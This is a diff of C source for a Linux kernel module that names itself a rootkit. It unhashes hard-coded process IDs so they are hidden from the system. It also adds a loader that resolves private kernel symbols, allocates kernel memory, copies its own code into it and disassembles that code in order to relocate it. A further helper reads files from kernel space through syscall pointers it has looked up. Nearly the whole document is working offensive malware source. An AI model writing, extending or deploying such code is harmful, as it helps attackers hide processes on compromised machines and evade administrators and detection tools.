@@ -17,6 +17,11 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
  */
 
+char code_start = 0;
+
+#include <linux/moduleloader.h>
+#include <linux/set_memory.h>
+#include <linux/mman.h>
 #include <linux/slab.h>
 #include <linux/namei.h>
 #include <linux/proc_fs.h>
@@ -30,158 +35,192 @@
 #include <linux/init.h>         /* Needed for the macros */
 #include <linux/tty.h>          /* For the tty declarations */
 #include <linux/version.h> /* For LINUX_VERSION_CODE */
+#include <linux/init.h>
+#include <linux/syscalls.h>
+#include <linux/fcntl.h>
+#include <asm/uaccess.h>
+#include <capstone.h>
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
-MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
-MODULE_SUPPORTED_DEVICE("testdevice");
+#define PREFIX_MAX 32
+#define LOG_LINE_MAX (1024 - PREFIX_MAX)
 
+const char banner[] = "Hello world";
 
-#define pid_hashfn(nr, ns)  \
-    hash_long((unsigned long)nr + (unsigned long)ns, pidhash_shift)
-struct hlist_head *pid_hash = NULL;
-unsigned int pidhash_shift = 0;
-
-#define PREFIX_MAX      32
-#define LOG_LINE_MAX        (1024 - PREFIX_MAX)
-
-int hide_pid(pid_t pid);
-int unhide_pid(pid_t pid);
-void pinfo(const char *fmt, ...);
-void vpinfo(const char *fmt, va_list args);
-int *nr_threads = NULL;
-//unsigned long process_counts = 0;
-
+/*
+ * Types
+ */
 struct pid_list_node {
 	pid_t nr;
 	struct task_struct *task;
 	struct pid_list_node *next;
-} *pid_list_head = NULL, *pid_list_tail = NULL;
+};
 
+/*
+ * Declarations
+ */
+int hide_pid(pid_t pid);
+int unhide_pid(pid_t pid);
+void pinfo(const char *fmt, ...);
+void vpinfo(const char *fmt, va_list args);
 void pid_list_create(void);
 void pid_list_destroy(void);
 void pid_list_push(pid_t nr, struct task_struct *task);
 struct task_struct *pid_list_pop(pid_t nr);
-
 void __unhash_process(struct task_struct *p, bool group_dead);
 void __change_pid(struct task_struct *task, enum pid_type type,
             struct pid *new);
 void attach_pid(struct task_struct *task, enum pid_type type);
+void *readfile(const char *file, size_t *len);
+extern char code_end;
+void entrypoint(void);
+int relocate(void *code, size_t code_len);
 
-static int __init init_rootkit(void)
+int init_module(void)
 {
-    //pinfo("Hello world\n");
+	size_t code_len;
+	void *code = NULL, (*run)(void);
+	void * (*module_alloc)(size_t len);
 
-	//pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
-	//pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));
-	nr_threads = (int *) kallsyms_lookup_name("nr_threads");
-	//process_counts = (unsigned long) kallsyms_lookup_name("process_counts");
+	pinfo(banner);
 
-	//pinfo("%p unhash_process", __unhash_process);
-	//if (pid_hash == NULL || pidhash_shift == 0) {
-	//	pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
-	//	return -1;
-	//}
+	code_len = &code_end - &code_start;
+	//set_memory_rw = kallsyms_lookup_name("set_memory_rw");
+	//set_memory_rw((unsigned long)&code_start - PAGE_SIZE, 1);
+    //set_memory_rw((unsigned long)&code_start, code_len / PAGE_SIZE);
+    //set_memory_rw((unsigned long)&code_start + code_len, 1);
 
-	//pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d\n", pid_hash, pidhash_shift, nr_threads);
+	module_alloc = kallsyms_lookup_name("module_alloc");
 
-	pid_list_create();
+	pinfo("lkm: code_end = %p, code_start = %p, code_len = %d", &code_end, &code_start, code_len);
+	pinfo("lkm: entrypoint = %p", entrypoint);
 
-	hide_pid(3924);
-	hide_pid(3925);
-	//unhide_pid(9311);
+	if (module_alloc) {
+		code = module_alloc(code_len);
+	}
+
+	if (code != NULL) {
+		//set_memory_x((unsigned long)code - PAGE_SIZE, 1);
+		//set_memory_x((unsigned long)code, code_len / PAGE_SIZE);
+		//set_memory_x((unsigned long)code + code_len, 1);
+		run = code + ((unsigned long)&entrypoint - (unsigned long)&code_start);
+		pinfo("allocated: code = %p, entrypoint = %p", code, run);
+		memcpy(code, &code_start, code_len);
+		pinfo("code copied");
+		relocate(code, code_len);
+		//run();
+
+		//kzfree(code);
+	} else {
+		pinfo("can not allocate memory");
+	}
+
+    return 0;
+}
+
+void cleanup_module(void)
+{
+}
+
+int *nr_threads = NULL;
+struct pid_list_node *pid_list_head = NULL, *pid_list_tail = NULL;
+int (*open)(const char *filename, int flags, umode_t mode);
+int (*read)(unsigned int fd, char *buf, size_t count);
+int (*newfstat)(unsigned int fd, struct stat *statbuf);
+int (*close)(unsigned int fd);
+
+void entrypoint(void) {
+    nr_threads = kallsyms_lookup_name("nr_threads");
+    open = kallsyms_lookup_name("sys_open");
+    read = kallsyms_lookup_name("sys_read");
+    newfstat = kallsyms_lookup_name("sys_newfstat");
+    close = kallsyms_lookup_name("sys_close");
+
+    //pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d\n", pid_hash, pidhash_shift, nr_threads);
+
+    pid_list_create();
+
+    hide_pid(3924);
+    hide_pid(3925);
+    //unhide_pid(9311);
+}
+
+void cleanup(void) {
+    pid_list_destroy();
+}
+
+int relocate(void *code, size_t code_len) {
+	csh handle;
+	cs_insn *insn;
+	size_t count;
+	
+	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
+		pinfo("cs_open() error");
+		return -1;
+	}
+
+	pinfo("%d\n", code_len);
+	size_t func_off = ((unsigned long)&init_module - (unsigned long)&code_start);
+	pinfo("func_off = %d", func_off);
+	count = cs_disasm(handle, code + func_off, code_len - func_off, (unsigned long)&code_start + func_off, 0, &insn);
+	pinfo("%d\n", count);
+	if (count > 0) {
+		size_t j;
+		for (j = 0; j < count; j++) {
+			pinfo("0x%"PRIx64":\t%s\t\t%s", insn[j].address, insn[j].mnemonic, insn[j].op_str);
+			size_t i;
+			for (i = 0; i< insn[j].size; i++) {
+				pinfo("%02x", insn[j].bytes[i]);
+			}
+		}
+		cs_free(insn, count);
+	} else {
+		pinfo("ERROR: Failed to disassemble given code!\n");
+		cs_close(&handle);
+		return -1;
+	}
+	cs_close(&handle);
 
 	return 0;
 }
 
-static void __exit cleanup_rootkit(void)
-{
-	pid_list_destroy();
-}
-
 int hide_pid(pid_t nr) {
-	//struct pid_namespace *ns = task_active_pid_ns(current);
-	//struct upid *pnr;
-	//printk("ns %p\n", ns);
-	//printk("nr %d\n", nr);
-	//struct hlist_head *head;
-	//struct hlist_node *node;
 	struct pid *pid;
 	struct task_struct *task;
-	//struct list_head *task_next, *task_prev;
-	//char path_name[50];
-	//struct path path;
-
-	//head = &pid_hash[pid_hashfn(nr, ns)];
-	//node = hlist_first_rcu(head);
-	//pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
-	//if (pnr) {
-		//printk("%d\n", pnr->nr);
-		//if (pnr->nr == nr && pnr->ns == ns) {
-		pid = find_vpid(nr);
-		if (pid) {
-			//pinfo("found pid %d", nr);
-			//pid = container_of(pnr, struct pid, numbers[ns->level]);
-			task = get_pid_task(pid, PIDTYPE_PID);
-			if (task) {
-				//printk("task = %p\n", task);
-//				task_prev = task->tasks.next->prev;
-//				task_next = task->tasks.prev->next;
-//				task->tasks.next->prev = task->tasks.prev;
-//				task->tasks.prev->next = task->tasks.next;
-				__unhash_process(task, false);
-				pid_list_push(nr, task);
-//				attach_pid(task, PIDTYPE_PID);
-//				hlist_del_rcu(node);
-//				pid_hash[pid_hashfn(nr, ns)].first = NULL;
-				//snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
-				//kern_path(path_name, LOOKUP_FOLLOW, &path);
-				//d_delete(path.dentry);
-				// unhide
-				//d_rehash(path.dentry);
-				//hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
-				//task->tasks.next->prev = task_prev;
-				//task->tasks.prev->next = task_next;
-
-				pinfo("find_vpid %p", find_vpid(nr));
-				
-				pinfo("Ok");
+	
+	pid = find_vpid(nr);
+	if (pid) {
+		task = get_pid_task(pid, PIDTYPE_PID);
+		if (task) {
+			__unhash_process(task, false);
+			pid_list_push(nr, task);
+			pinfo("find_vpid %p", find_vpid(nr));
+			pinfo("Ok");
 		
-				return 0;
-			} else {
-				pinfo("task_struct for PID %d not found", nr);
-			}
+			return 0;
 		} else {
-			pinfo("PID not found.");
+			pinfo("task_struct for PID %d not found", nr);
 		}
-//	} else {
-//		pinfo("Unknown error 1.");
-//	}
+	} else {
+		pinfo("PID not found.");
+	}
 
 	return -1;
 }
 
 int unhide_pid(pid_t nr) {
-	//struct pid *pid;
 	struct task_struct *task;
 
-	//pid = find_vpid(nr);
-	//if (pid) {
-		//task = get_pid_task(pid, PIDTYPE_PID);
-		task = pid_list_pop(nr);
-		if (task) {
-			attach_pid(task, PIDTYPE_PID);
+	task = pid_list_pop(nr);
+	if (task) {
+		attach_pid(task, PIDTYPE_PID);
 
-			pinfo("Ok");
+		pinfo("Ok");
 
-			return 0;
-		} else {
-			pinfo("task not found");
-		}
-	//} else {
-	//	pinfo("pid not found");
-	//}
-
+		return 0;
+	} else {
+		pinfo("task not found");
+	}
+	
 	return -1;
 }
 
@@ -293,6 +332,38 @@ void __unhash_process(struct task_struct *p, bool group_dead)
 */
 }
 
+void *readfile(const char *file, size_t *len) {
+	int fd;
+	void *buf;
+	struct stat fd_st;
+
+	mm_segment_t old_fs = get_fs();
+	set_fs(KERNEL_DS);
+	fd = open(file, O_RDONLY, 0);
+	if (fd >= 0) {
+		newfstat(fd, &fd_st);
+		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
+		if (buf) {
+			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
+				*len = fd_st.st_size;
+				close(fd);
+				return buf;
+			} else {
+				pinfo("can't read lkm");
+			}
+		} else {
+			pinfo("create_load_info kmalloc error");
+		}
+
+		close(fd);
+	} else {
+		pinfo("can't open lkm");
+	}
+	set_fs(old_fs);
+
+	return NULL;
+}
+
 // from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
 // from linux-source/kernel/printk/printk.c
 void pinfo(const char *fmt, ...) {
@@ -387,5 +458,9 @@ void vpinfo(const char *fmt, va_list args) {
     }
 }
 
-module_init(init_rootkit);
-module_exit(cleanup_rootkit);
+char code_end = 0;
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
+MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
+MODULE_SUPPORTED_DEVICE("testdevice");
